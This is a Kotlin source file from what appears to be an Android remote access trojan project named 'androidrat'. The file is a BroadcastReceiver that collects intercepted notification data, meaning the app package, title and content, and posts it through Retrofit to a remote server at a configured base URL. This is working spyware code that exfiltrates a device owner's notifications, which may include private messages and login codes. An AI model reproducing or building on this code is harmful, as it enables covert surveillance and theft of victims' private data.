package com.nqmgaming.androidrat.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.nqmgaming.androidrat.core.util.Constant
import com.nqmgaming.androidrat.data.ApiService
import com.nqmgaming.androidrat.data.dto.NotificationDto
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class NotificationReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d("NotificationReceiver", "Notification received")
        intent?.let {
            if ("notification_data" == it.action) {
                val packageName = it.getStringExtra("package_name")
                val notificationContent = it.getStringExtra("notification_content")
                val notificationTitle = it.getStringExtra("notification_title")
                val formData = mutableMapOf<String, String>()

                formData["packageName"] = packageName ?: ""
                formData["notificationContent"] = notificationContent ?: ""
                formData["notificationTitle"] = notificationTitle ?: ""

                val notificationDto = NotificationDto(
                    packageName = packageName ?: "",
                    notificationContent = notificationContent ?: "",
                    notificationTitle = notificationTitle ?: ""
                )

                println("Notification received: $notificationDto")

                val retrofit = Retrofit.Builder()
                    .baseUrl(Constant.BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build()

                val apiService = retrofit.create(ApiService::class.java)


                apiService.postNotification(notificationDto).execute().let { response ->
                    if (response.isSuccessful) {
                        println("Notification sent successfully")
                    } else {
                        println("Failed to send notification" + response.errorBody()?.string() + response.code() + response.message())
                    }
                }

            }
        }
    }

}